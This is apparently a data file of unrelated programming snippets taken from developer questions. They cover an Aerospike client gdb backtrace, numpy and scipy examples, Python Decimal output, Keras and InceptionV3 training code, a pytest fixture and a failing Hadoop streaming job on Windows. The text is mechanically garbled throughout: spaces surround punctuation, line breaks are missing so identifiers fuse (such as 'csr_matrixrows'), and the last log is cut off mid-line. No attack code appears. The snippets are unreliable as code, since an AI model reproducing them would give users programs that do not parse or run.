retry=1 , parse_results_fn=0x7fffdf21a97b < as_command_parse_result > , parse_results_data=0x7fffffffc7e0 ) at src/include/aerospike/as_cluster.h:562 # 2 as_command_execute ( cluster=0x353bd90508 , err=0x7fffffffc920 , cn=0x7fffffffc7c0 , command=0x7fffffffc740 `` \002\003 '' , command_len=82 , timeout_ms=1000 , retry=1 , parse_results_fn=0x7fffdf21a97b < as_command_parse_result > , parse_results_data=0x7fffffffc7e0 ) at src/main/aerospike/as_command.c:435 # 3 0x00007fffdf211a67 in aerospike_key_get ( as=0x17dead0 , err=0x7fffffffc920 , policy=0x17dfbb0 , key= < value optimized out > , rec=0x7fffffffc848 ) at src/main/aerospike/aerospike_key.c:114 # 4 0x00007fffdf1e4295 in AerospikeClient_Get_Invoke ( self=0x720d30 , py_key=0x7fffb0b05730 , py_policy= < value optimized out > ) at src/main/client/get.c:96 # 5 0x00007fffdf1e44a0 in AerospikeClient_Get ( self=0x720d30 , args= < value optimized out > , kwds= < value optimized out > ) at src/main/client/get.c:174 # 6 0x00007ffff7d12f24 in call_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4033 # 7 PyEval_EvalFrameEx ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:2679 # 8 0x00007ffff7d1399e in fast_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4119 # 9 call_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4054 # 10 PyEval_EvalFrameEx ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:2679 # 11 0x00007ffff7d14a9e in PyEval_EvalCodeEx ( co=0x7ffff7b0ee30 , globals= < value optimized out > , locals= < value optimized out > , args= < value optimized out > , argcount=1 , kws=0x7ffff7bc6068 , kwcount=0 , defs=0x0 , defcount=0 , closure=0x0 ) at Python/ceval.c:3265 # 12 0x00007ffff7c927c8 in function_call ( func=0x7fffdf1936e0 , arg=0x7fffb0af9450 , kw=0x7fffde2dfd70 ) at Objects/funcobject.c:526 # 13 0x00007ffff7c631a3 in PyObject_Call ( func=0x7fffdf1936e0 , arg= < value optimized out > , kw= < value optimized out > ) at Objects/abstract.c:2529 # 14 0x00007ffff7d11746 in ext_do_call ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4346 # 15 PyEval_EvalFrameEx ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:2718 # 16 0x00007ffff7d14a9e in PyEval_EvalCodeEx ( co=0x7fffe041f6b0 , globals= < value optimized out > , locals= < value optimized out > , args= < value optimized out > , argcount=1 , kws=0x1e142b0 , kwcount=0 , defs=0x0 , defcount=0 , closure=0x7fffde39bbe0 ) at Python/ceval.c:3265 # 17 0x00007ffff7d12c52 in fast_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4129 # 18 call_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4054 # 19 PyEval_EvalFrameEx ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:2679 # 20 0x00007ffff7d14a9e in PyEval_EvalCodeEx ( co=0x7fffe042b1b0 , globals= < value optimized out > , locals= < value optimized out > , args= < value optimized out > , argcount=4 , kws=0x7fffcbc517e0 , kwcount=0 , defs=0x7fffdffa8428 , defcount=1 , closure=0x0 ) at Python/ceval.c:3265 # 21 0x00007ffff7d12c52 in fast_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4129 # 22 call_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4054 # 23 PyEval_EvalFrameEx ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:2679 # 24 0x00007ffff7d1399e in fast_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4119 # 25 call_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4054 # 26 PyEval_EvalFrameEx ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:2679 # 27 0x00007ffff7d14a9e in PyEval_EvalCodeEx ( co=0x7fffe041f730 , globals= < value optimized out > , locals= < value optimized out > , args= < value optimized out > , argcount=2 , kws=0x1d6c958 , kwcount=0 , defs=0x0 , defcount=0 , closure=0x0 ) at Python/ceval.c:3265 # 28 0x00007ffff7d12c52 in fast_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4129 # 29 call_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4054 # 30 PyEval_EvalFrameEx ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:2679 # 31 0x00007ffff7d14a9e in PyEval_EvalCodeEx ( co=0x7ffff1ac6030 , globals= < value optimized out > , locals= < value optimized out > , args= < value optimized out > , argcount=1 , kws=0x7fffde5b85b8 , kwcount=1 , defs=0x7fffdf18bfa8 , defcount=1 , closure=0x0 ) at Python/ceval.c:3265 # 32 0x00007ffff7d12c52 in fast_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4129 # 33 call_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4054 # 34 PyEval_EvalFrameEx ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:2679 # 35 0x00007ffff7d14a9e in PyEval_EvalCodeEx ( co=0x7ffff1ac6130 , globals= < value optimized out > , locals= < value optimized out > , args= < value optimized out > , argcount=0 , kws=0x662d48 , kwcount=1 , defs=0x7fffdf18bfe8 , defcount=1 , closure=0x0 ) at Python/ceval.c:3265 # 36 0x00007ffff7d12c52 in fast_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4129 # 37 call_function ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:4054 # 38 PyEval_EvalFrameEx ( f= < value optimized out > , throwflag= < value optimized out > ) at Python/ceval.c:2679 # 39 0x00007ffff7d14a9e in PyEval_EvalCodeEx ( co=0x7ffff1ac6230 , globals= < value optimized out > , locals= < value optimized out > , args= < value optimized out > , argcount=0 , kws=0x0 , kwcount=0 , defs=0x0 , defcount=0 , closure=0x0 ) at Python/ceval.c:3265 -- -Type < return > to continue , or q < return > to quit -- - # 40 0x00007ffff7d14bb2 in PyEval_EvalCode ( co= < value optimized out > , globals= < value optimized out > , locals= < value optimized out > ) at Python/ceval.c:673 # 41 0x00007ffff7d34850 in run_mod ( fp=0x65f7b0 , filename= < value optimized out > , start= < value optimized out > , globals=0x7ffff7b9b168 , locals=0x7ffff7b9b168 , closeit=1 , flags=0x7fffffffe0e0 ) at Python/pythonrun.c:1377 # 42 PyRun_FileExFlags ( fp=0x65f7b0 , filename= < value optimized out > , start= < value optimized out > , globals=0x7ffff7b9b168 , locals=0x7ffff7b9b168 , closeit=1 , flags=0x7fffffffe0e0 ) at Python/pythonrun.c:1363 # 43 0x00007ffff7d34a2f in PyRun_SimpleFileExFlags ( fp=0x65f7b0 , filename=0x7fffffffe4d9 `` bidlandscape_sf.py '' , closeit=1 , flags=0x7fffffffe0e0 ) at Python/pythonrun.c:955 # 44 0x00007ffff7d4a194 in Py_Main ( argc= < value optimized out > , argv= < value optimized out > ) at Modules/main.c:640 # 45 0x000000353ba1ed5d in __libc_start_main ( main=0x400710 < main > , argc=7 , ubp_av=0x7fffffffe208 , init= < value optimized out > , fini= < value optimized out > , rtld_fini= < value optimized out > , stack_end=0x7fffffffe1f8 ) at libc-start.c:226 # 46 0x0000000000400649 in _start ( ) Metadata-Version : 1.1 Name : aerospike Version : 2.0.1 Summary : Aerospike Client Library for Python Home-page : http : //aerospike.com Author : Aerospike , Inc. Author-email : info @ aerospike.com License : Apache Software License Location : /home/hdfs/graphlab/lib/python2.7/site-packages Requires : Classifiers : License : : OSI Approved : : Apache Software License Operating System : : POSIX : : Linux Operating System : : MacOS : : MacOS X Programming Language : : Python : : 2.6 Programming Language : : Python : : 2.7 Programming Language : : Python : : 3.5 Programming Language : : Python : : Implementation : : CPython Topic : : Database Files : ../../../aerospike ../../../aerospike/lua/aerospike.lua ../../../aerospike/lua/as.lua ../../../aerospike/lua/stream_ops.lua ../../../aerospike/usr-lua aerospike-2.0.1-py2.7.egg-info aerospike-2.0.1-py2.7.egg-info/PKG-INFO aerospike-2.0.1-py2.7.egg-info/SOURCES.txt aerospike-2.0.1-py2.7.egg-info/dependency_links.txt aerospike-2.0.1-py2.7.egg-info/eager_resources.txt aerospike-2.0.1-py2.7.egg-info/not-zip-safe aerospike-2.0.1-py2.7.egg-info/top_level.txt aerospike.soecho $ LD_LIBRARY_PATH/home/hdfs/graphlab/lib/python2.7/site-packages/ : /usr/local/lib : /home/hdfs/python-2.7.8-install/lib/ : /home/hdfs/python-3.4.2-install/lib/"
"from scipy.sparse import csr_matrixrows = [ 0 , 0 , 0 ] columns = [ 100 , 47 , 150 ] data = [ -1 , +1 , -1 ] contextMatrix = csr_matrix ( ( data , ( rows , columns ) ) , shape= ( 1 , 300 ) )"
"type Word struct { text string synonyms [ ] string } [ ] Word { { text : `` cat '' synonyms : [ `` feline '' , `` kitten '' , `` mouser '' ] } { text : `` kitten '' synonyms : [ `` kitty '' , `` kit '' ] } { text : `` kit '' synonyms : [ `` pack '' , `` bag '' , `` gear '' ] } { text : `` computer '' synonyms : [ `` electronics '' , `` PC '' , `` abacus '' ] } } areWordsRelated ( word1 Word , word2 Word ) bool { for _ , elem : = range word1.synonyms { if elem == word2.text { return true } } return false } areWordsRelated ( `` cat '' , '' pack '' ) //should return true //because `` cat '' is related to `` kitten '' which is related to `` pack '' areWordsRelated ( `` cat '' , `` computer '' ) //should return false"
> > > Decimal ( '.01 ' ) **Decimal ( '1e5 ' ) # Seems to handle thisDecimal ( '1E-200000 ' ) > > > Decimal ( '.01 ' ) **Decimal ( '1e5 ' ) *Decimal ( '1E200000 ' ) # Yeah ! It works ! Decimal ( ' 1 ' ) > > > Decimal ( '.01 ' ) **Decimal ( '1e6 ' ) # This result is strange ... Decimal ( '0E-1000026 ' ) > > > Decimal ( '.01 ' ) **Decimal ( '1e6 ' ) *Decimal ( '0E1000026 ' ) # Wrong resultDecimal ( ' 0 ' )
"def MAEpw_wrapper ( y_prec ) : def MAEpw ( y_true , y_pred ) : return K.mean ( K.square ( y_prec * ( y_pred - y_true ) ) ) return MAEpw global y_precy_prec = K.variable ( P [ :32 ] ) class DataGenerator ( Sequence ) : def __init__ ( self , batch_size , y , shuffle=True ) : self.batch_size = batch_size self.y = y self.shuffle = shuffle self.on_epoch_end ( ) def on_epoch_end ( self ) : self.indexes = np.arange ( len ( self.y ) ) if self.shuffle == True : np.random.shuffle ( self.indexes ) def __len__ ( self ) : return int ( np.floor ( len ( self.y ) / self.batch_size ) ) def __getitem__ ( self , index ) : indexes = self.indexes [ index * self.batch_size : ( index+1 ) * self.batch_size ] # Set precision vector . global y_prec new_y_prec = K.variable ( P [ indexes ] ) y_prec = K.update ( y_prec , new_y_prec ) # Get training examples . y = self.y [ indexes ] return y , y dims = [ 40 , 20 , 2 ] model2 = Sequential ( ) model2.add ( Dense ( dims [ 0 ] , input_dim=64 , activation='relu ' ) ) model2.add ( Dense ( dims [ 1 ] , input_dim=dims [ 0 ] , activation='relu ' ) ) model2.add ( Dense ( dims [ 2 ] , input_dim=dims [ 1 ] , activation='relu ' , name='bottleneck ' ) ) model2.add ( Dense ( dims [ 1 ] , input_dim=dims [ 2 ] , activation='relu ' ) ) model2.add ( Dense ( dims [ 0 ] , input_dim=dims [ 1 ] , activation='relu ' ) ) model2.add ( Dense ( 64 , input_dim=dims [ 0 ] , activation='linear ' ) ) model2.compile ( optimizer='adam ' , loss=MAEpw_wrapper ( y_prec ) ) model2.fit_generator ( DataGenerator ( 32 , digits.data ) , epochs=100 ) StopIteration : Tensor ( `` Variable:0 '' , shape= ( 32 , 64 ) , dtype=float32_ref ) must be from the same graph as Tensor ( `` Variable_4:0 '' , shape= ( 32 , 64 ) , dtype=float32_ref ) ."
> gc.collect ( ) > > print gc.garbage
"x = np.array ( [ -1,10,3 ] ) low = np.array ( [ 0,0,1 ] ) high = np.array ( [ 2,5,4 ] ) clipped_x = np.clip ( x , low , high ) clipped_x == np.array ( [ 0,5,3 ] ) # True"
"@ pytest.fixture ( ) def client ( test_client , loop ) : app = init ( loop ) return loop.run_until_complete ( test_client ( app ) ) class TestGetAlerts : async def test_get_login_url ( self , client ) : resp = await client.get ( '/api/get_login_url ' ) assert resp.status == 200"
`` /root/d1/d2/d1/d2 '' + `` d2/d1/d2/file.txt '' == `` /root/d1/d2/d1/d2/file.txt '' and not `` /root/d1/d2/d1/d2/d1/d2/file.txt ''
Checking distribution dist/akinator.py-1.0.3.dev3-py3-none-any.whl : warning : ` long_description_content_type ` missing . defaulting to ` text/x-rst ` .FailedThe project 's long_description has invalid markup which will not be rendered on PyPI . The following syntax errors were detected : line 26 : Error : Unexpected indentation.Checking distribution dist/akinator.py-1.0.3.dev3.tar.gz : warning : ` long_description_content_type ` missing . defaulting to ` text/x-rst ` .FailedThe project 's long_description has invalid markup which will not be rendered on PyPI . The following syntax errors were detected : line 26 : Error : Unexpected indentation.line 26 : Error : Unexpected indentation .
regex = `` . * ( a_regex_of_pure_awesomeness ) '' regex = `` a_regex_of_pure_awesomeness ''
"class Test : def __init__ ( self , *args ) : # do stuff @ property def new_method ( self ) : try : return self._new_property except AttributeError : # do some heavy calculations return self._new_property from functools import lru_cacheclass Test : def __init__ ( self , *args ) : # do stuff @ property @ lru_cache ( ) def new_method ( self ) : # do some heavy calculations return self._new_property from django.utils.functional import cached_propertyclass Test : def __init__ ( self , *args ) : # do stuff @ cached_property def new_method ( self ) : # do some heavy calculations return self._new_property"
"def create_bottlenecks ( ) : datagen = ImageDataGenerator ( rescale=1 . / 255 ) model = InceptionV3 ( include_top=False , weights='imagenet ' ) # Generate bottlenecks for all training imagesgenerator = datagen.flow_from_directory ( train_data_dir , target_size= ( img_width , img_height ) , batch_size=batch_size , class_mode=None , shuffle=False ) nb_train_samples = len ( generator.filenames ) bottlenecks_train = model.predict_generator ( generator , int ( math.ceil ( nb_train_samples / float ( batch_size ) ) ) , verbose=1 ) np.save ( open ( train_bottlenecks_file , ' w ' ) , bottlenecks_train ) # Generate bottlenecks for all validation imagesgenerator = datagen.flow_from_directory ( validation_data_dir , target_size= ( img_width , img_height ) , batch_size=batch_size , class_mode=None , shuffle=False ) nb_validation_samples = len ( generator.filenames ) bottlenecks_validation = model.predict_generator ( generator , int ( math.ceil ( nb_validation_samples / float ( batch_size ) ) ) , verbose=1 ) np.save ( open ( validation_bottlenecks_file , ' w ' ) , bottlenecks_validation ) def load_bottlenecks ( src_dir , bottleneck_file ) : datagen = ImageDataGenerator ( rescale=1 . / 255 ) generator = datagen.flow_from_directory ( src_dir , target_size= ( img_width , img_height ) , batch_size=batch_size , class_mode='categorical ' , shuffle=False ) num_classes = len ( generator.class_indices ) # load the bottleneck features saved earlier bottleneck_data = np.load ( bottleneck_file ) # get the class lebels for the training data , in the original order bottleneck_class_labels = generator.classes # convert the training labels to categorical vectors bottleneck_class_labels = to_categorical ( bottleneck_class_labels , num_classes=num_classes ) return bottleneck_data , bottleneck_class_labels def start_training ( ) : global nb_train_samples , nb_validation_samplescreate_bottlenecks ( ) train_data , train_labels = load_bottlenecks ( train_data_dir , train_bottlenecks_file ) validation_data , validation_labels = load_bottlenecks ( validation_data_dir , validation_bottlenecks_file ) nb_train_samples = len ( train_data ) nb_validation_samples = len ( validation_data ) base_model = InceptionV3 ( weights='imagenet ' , include_top=False ) # add a global spatial average pooling layerx = base_model.outputx = GlobalAveragePooling2D ( ) ( x ) # let 's add a fully-connected layerx = Dense ( 1024 , activation='relu ' ) ( x ) # and a logistic layer -- let 's say we have 2 classespredictions = Dense ( 2 , activation='softmax ' ) ( x ) # What is the correct input ? Obviously not base_model.input.model = Model ( inputs=base_model.input , outputs=predictions ) # first : train only the top layers ( which were randomly initialized ) # i.e . freeze all convolutional InceptionV3 layersfor layer in base_model.layers : layer.trainable = Falsemodel.compile ( optimizer=optimizers.SGD ( lr=0.01 , momentum=0.9 ) , loss='categorical_crossentropy ' , metrics= [ 'accuracy ' ] ) # train the model on the new data for a few epochshistory = model.fit ( train_data , train_labels , epochs=epochs , batch_size=batch_size , validation_data= ( validation_data , validation_labels ) , )"
"df.head ( ) Out [ 339 ] : A B CDATE_TIME 2016-10-08 13:57:00 in 5.61 12016-10-08 14:02:00 in 8.05 12016-10-08 14:07:00 in 7.92 02016-10-08 14:12:00 in 7.98 02016-10-08 14:17:00 out 8.18 0df.tail ( ) Out [ 340 ] : A B CDATE_TIME 2016-11-08 13:42:00 in 8.00 02016-11-08 13:47:00 in 7.99 02016-11-08 13:52:00 out 7.97 02016-11-08 13:57:00 in 8.14 12016-11-08 14:02:00 in 8.16 1 print ( df.dtypes ) A objectB float64C int64dtype : object index = pd.date_range ( df.index [ 0 ] , df.index [ -1 ] , freq= '' min '' ) df2 = df.reindex ( index ) print ( df2.dtypes ) A objectB float64C float64dtype : object print ( df3.dtypes ) B float64C float64dtype : object"
"import numpy as npfrom scipy.spatial.distance import cdistdef ABdist ( A , B ) : # Distance to all points in B , for each point in A. dist = cdist ( A , B , 'euclidean ' ) # Indexes to minimum distances . min_dist_idx = np.argmin ( dist , axis=1 ) # Store only the minimum distances for each point in A , to a point in B. min_dists = [ dist [ i ] [ md_idx ] for i , md_idx in enumerate ( min_dist_idx ) ] return min_dist_idx , min_distsN = 10000A = np.random.uniform ( 0. , 5000. , ( N , 2 ) ) B = np.random.uniform ( 0. , 5000. , ( N , 2 ) ) min_dist_idx , min_dists = ABdist ( A , B ) dm = np.zeros ( ( mA , mB ) , dtype=np.double ) MemoryError"
"import numpy as npnp.random.seed ( 1 ) # Setupsample = np.random.normal ( loc=20 , scale=6 , size=10 ) intervals = [ -np.inf , 10 , 12 , 15 , 18 , 21 , 25 , 30 , np.inf ] # Round each interval upfor i in range ( len ( intervals ) - 1 ) : sample [ np.logical_and ( sample > intervals [ i ] , sample < = intervals [ i+1 ] ) ] = intervals [ i+1 ] [ 30 . 18 . 18 . 15 . 30 . 10. inf 18 . 25 . 21 . ]"
"D : \hadoop\binC : \java\jdk1.8.0_161\binC : \ProgramData\Anaconda3 # ! /usr/bin/python3import sysfor line in sys.stdin : line = line.strip ( ) # remove leading and trailing whitespace words = line.split ( ) # split the line into words for word in words : print ( ' % s\t % s ' % ( word , 1 ) ) # ! /usr/bin/python3from operator import itemgetterimport syscurrent_word = Nonecurrent_count = 0word = Nonefor line in sys.stdin : line = line.strip ( ) word , count = line.split ( '\t ' , 1 ) try : count = int ( count ) except ValueError : continue if current_word == word : current_count += count else : if current_word : print ( ' % s\t % s ' % ( current_word , current_count ) ) current_count = count current_word = wordif current_word == word : print ( ' % s\t % s ' % ( current_word , current_count ) ) D : \hadoop\bin > hadoop namenode -formatD : \hadoop\sbin > start-dfs.cmdD : \hadoop\sbin > start-yarn.cmd D : \hadoop\sbin > hadoop fs -mkdir -p /inputD : \hadoop\sbin > hadoop fs -copyFromLocal D : \digit\mahsa.txt /inputD : \hadoop\sbin > D : \hadoop\bin\hadoop jar D : \hadoop\share\hadoop\tools\lib\hadoop-streaming-2.3.0.jar -file D : \digit\wordcount-mapper.py -mapper D : \digit\wordcount-mapper.py -file D : \digit\wordcount-reducer.py -reducer D : \digit\wordcount-reducer.py -input /input/mahsa.txt/ -output /output/ 18/02/21 21:49:24 WARN streaming.StreamJob : -file option is deprecated , please use generic option -files instead.packageJobJar : [ D : \digit\wordcount-mapper.py , D : \digit\wordcount-reducer.py , /D : /tmp/hadoop-Mahsa/hadoop-unjar7054071292684552905/ ] [ ] C : \Users\Mahsa\AppData\Local\Temp\streamjob2327207111481875361.jar tmpDir=null18/02/21 21:49:25 INFO client.RMProxy : Connecting to ResourceManager at /0.0.0.0:803218/02/21 21:49:25 INFO client.RMProxy : Connecting to ResourceManager at /0.0.0.0:803218/02/21 21:49:28 INFO mapred.FileInputFormat : Total input paths to process : 118/02/21 21:49:28 INFO mapreduce.JobSubmitter : number of splits:218/02/21 21:49:29 INFO mapreduce.JobSubmitter : Submitting tokens for job : job_1519235874088_000318/02/21 21:49:29 INFO impl.YarnClientImpl : Submitted application application_1519235874088_000318/02/21 21:49:29 INFO mapreduce.Job : The url to track the job : http : //Mahsa:8088/proxy/application_1519235874088_0003/18/02/21 21:49:29 INFO mapreduce.Job : Running job : job_1519235874088_000318/02/21 21:49:42 INFO mapreduce.Job : Job job_1519235874088_0003 running in uber mode : false18/02/21 21:49:42 INFO mapreduce.Job : map 0 % reduce 0 % 18/02/21 21:49:52 INFO mapreduce.Job : Task Id : attempt_1519235874088_0003_m_000001_0 , Status : FAILEDError : java.lang.RuntimeException : Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:109 ) at org.apache.hadoop.util.ReflectionUtils.setConf ( ReflectionUtils.java:75 ) at org.apache.hadoop.util.ReflectionUtils.newInstance ( ReflectionUtils.java:133 ) at org.apache.hadoop.mapred.MapTask.runOldMapper ( MapTask.java:426 ) at org.apache.hadoop.mapred.MapTask.run ( MapTask.java:342 ) at org.apache.hadoop.mapred.YarnChild $ 2.run ( YarnChild.java:168 ) at java.security.AccessController.doPrivileged ( Native Method ) at javax.security.auth.Subject.doAs ( Subject.java:422 ) at org.apache.hadoop.security.UserGroupInformation.doAs ( UserGroupInformation.java:1548 ) at org.apache.hadoop.mapred.YarnChild.main ( YarnChild.java:163 ) Caused by : java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0 ( Native Method ) at sun.reflect.NativeMethodAccessorImpl.invoke ( NativeMethodAccessorImpl.java:62 ) at sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:43 ) at java.lang.reflect.Method.invoke ( Method.java:498 ) at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:106 ) ... 9 moreCaused by : java.lang.RuntimeException : Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:109 ) at org.apache.hadoop.util.ReflectionUtils.setConf ( ReflectionUtils.java:75 ) at org.apache.hadoop.util.ReflectionUtils.newInstance ( ReflectionUtils.java:133 ) at org.apache.hadoop.mapred.MapRunner.configure ( MapRunner.java:38 ) ... 14 moreCaused by : java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0 ( Native Method ) at sun.reflect.NativeMethodAccessorImpl.invoke ( NativeMethodAccessorImpl.java:62 ) at sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:43 ) at java.lang.reflect.Method.invoke ( Method.java:498 ) at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:106 ) ... 17 moreCaused by : java.lang.RuntimeException : configuration exception at org.apache.hadoop.streaming.PipeMapRed.configure ( PipeMapRed.java:222 ) at org.apache.hadoop.streaming.PipeMapper.configure ( PipeMapper.java:66 ) ... 22 moreCaused by : java.io.IOException : Can not run program `` D : \tmp\hadoop-Mahsa\nm-local-dir\usercache\Mahsa\appcache\application_1519235874088_0003\container_1519235874088_0003_01_000003\.\wordcount-mapper.py '' : CreateProcess error=193 , % 1 is not a valid Win32 application at java.lang.ProcessBuilder.start ( ProcessBuilder.java:1048 ) at org.apache.hadoop.streaming.PipeMapRed.configure ( PipeMapRed.java:209 ) ... 23 moreCaused by : java.io.IOException : CreateProcess error=193 , % 1 is not a valid Win32 application at java.lang.ProcessImpl.create ( Native Method ) at java.lang.ProcessImpl. < init > ( ProcessImpl.java:386 ) at java.lang.ProcessImpl.start ( ProcessImpl.java:137 ) at java.lang.ProcessBuilder.start ( ProcessBuilder.java:1029 ) ... 24 more18/02/21 21:49:52 INFO mapreduce.Job : Task Id : attempt_1519235874088_0003_m_000000_0 , Status : FAILEDError : java.lang.RuntimeException : Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:109 ) at org.apache.hadoop.util.ReflectionUtils.setConf ( ReflectionUtils.java:75 ) at org.apache.hadoop.util.ReflectionUtils.newInstance ( ReflectionUtils.java:133 ) at org.apache.hadoop.mapred.MapTask.runOldMapper ( MapTask.java:426 ) at org.apache.hadoop.mapred.MapTask.run ( MapTask.java:342 ) at org.apache.hadoop.mapred.YarnChild $ 2.run ( YarnChild.java:168 ) at java.security.AccessController.doPrivileged ( Native Method ) at javax.security.auth.Subject.doAs ( Subject.java:422 ) at org.apache.hadoop.security.UserGroupInformation.doAs ( UserGroupInformation.java:1548 ) at org.apache.hadoop.mapred.YarnChild.main ( YarnChild.java:163 ) Caused by : java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0 ( Native Method ) at sun.reflect.NativeMethodAccessorImpl.invoke ( NativeMethodAccessorImpl.java:62 ) at sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:43 ) at java.lang.reflect.Method.invoke ( Method.java:498 ) at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:106 ) ... 9 moreCaused by : java.lang.RuntimeException : Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:109 ) at org.apache.hadoop.util.ReflectionUtils.setConf ( ReflectionUtils.java:75 ) at org.apache.hadoop.util.ReflectionUtils.newInstance ( ReflectionUtils.java:133 ) at org.apache.hadoop.mapred.MapRunner.configure ( MapRunner.java:38 ) ... 14 moreCaused by : java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0 ( Native Method ) at sun.reflect.NativeMethodAccessorImpl.invoke ( NativeMethodAccessorImpl.java:62 ) at sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:43 ) at java.lang.reflect.Method.invoke ( Method.java:498 ) at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:106 ) ... 17 moreCaused by : java.lang.RuntimeException : configuration exception at org.apache.hadoop.streaming.PipeMapRed.configure ( PipeMapRed.java:222 ) at org.apache.hadoop.streaming.PipeMapper.configure ( PipeMapper.java:66 ) ... 22 moreCaused by : java.io.IOException : Can not run program `` D : \tmp\hadoop-Mahsa\nm-local-dir\usercache\Mahsa\appcache\application_1519235874088_0003\container_1519235874088_0003_01_000002\.\wordcount-mapper.py '' : CreateProcess error=193 , % 1 is not a valid Win32 application at java.lang.ProcessBuilder.start ( ProcessBuilder.java:1048 ) at org.apache.hadoop.streaming.PipeMapRed.configure ( PipeMapRed.java:209 ) ... 23 moreCaused by : java.io.IOException : CreateProcess error=193 , % 1 is not a valid Win32 application at java.lang.ProcessImpl.create ( Native Method ) at java.lang.ProcessImpl. < init > ( ProcessImpl.java:386 ) at java.lang.ProcessImpl.start ( ProcessImpl.java:137 ) at java.lang.ProcessBuilder.start ( ProcessBuilder.java:1029 ) ... 24 more18/02/21 21:50:02 INFO mapreduce.Job : Task Id : attempt_1519235874088_0003_m_000001_1 , Status : FAILEDError : java.lang.RuntimeException : Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:109 ) at org.apache.hadoop.util.ReflectionUtils.setConf ( ReflectionUtils.java:75 ) at org.apache.hadoop.util.ReflectionUtils.newInstance ( ReflectionUtils.java:133 ) at org.apache.hadoop.mapred.MapTask.runOldMapper ( MapTask.java:426 ) at org.apache.hadoop.mapred.MapTask.run ( MapTask.java:342 ) at org.apache.hadoop.mapred.YarnChild $ 2.run ( YarnChild.java:168 ) at java.security.AccessController.doPrivileged ( Native Method ) at javax.security.auth.Subject.doAs ( Subject.java:422 ) at org.apache.hadoop.security.UserGroupInformation.doAs ( UserGroupInformation.java:1548 ) at org.apache.hadoop.mapred.YarnChild.main ( YarnChild.java:163 ) Caused by : java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0 ( Native Method ) at sun.reflect.NativeMethodAccessorImpl.invoke ( NativeMethodAccessorImpl.java:62 ) at sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:43 ) at java.lang.reflect.Method.invoke ( Method.java:498 ) at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:106 ) ... 9 moreCaused by : java.lang.RuntimeException : Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:109 ) at org.apache.hadoop.util.ReflectionUtils.setConf ( ReflectionUtils.java:75 ) at org.apache.hadoop.util.ReflectionUtils.newInstance ( ReflectionUtils.java:133 ) at org.apache.hadoop.mapred.MapRunner.configure ( MapRunner.java:38 ) ... 14 moreCaused by : java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0 ( Native Method ) at sun.reflect.NativeMethodAccessorImpl.invoke ( NativeMethodAccessorImpl.java:62 ) at sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:43 ) at java.lang.reflect.Method.invoke ( Method.java:498 ) at org.apache.hadoop.util.ReflectionUtils.setJobConf ( ReflectionUtils.java:106 ) ... 17 moreCaused by : java.lang.RuntimeException : configuration exception at org.apache.hadoop.streaming.PipeMapRed.configure ( PipeMapRed.java:222 ) at org.apache.hadoop.streaming.PipeMapper.configure ( PipeMapper.java:66 ) ... 22 moreCaused by : java.io.IOException : Can not run program `` D : \tmp\hadoop-Mahsa\nm-local-dir\usercache\Mahsa\appcache\application_1519235874088_0003\container_1519235874088_0003_01_000004\.\wordcount-mapper.py '' : CreateProcess error=193 , % 1 is not a valid Win32 application at java.lang.ProcessBuilder.start ( ProcessBuilder.java:1048 ) at org.apache.hadoop.streaming.PipeMapRed.configure ( 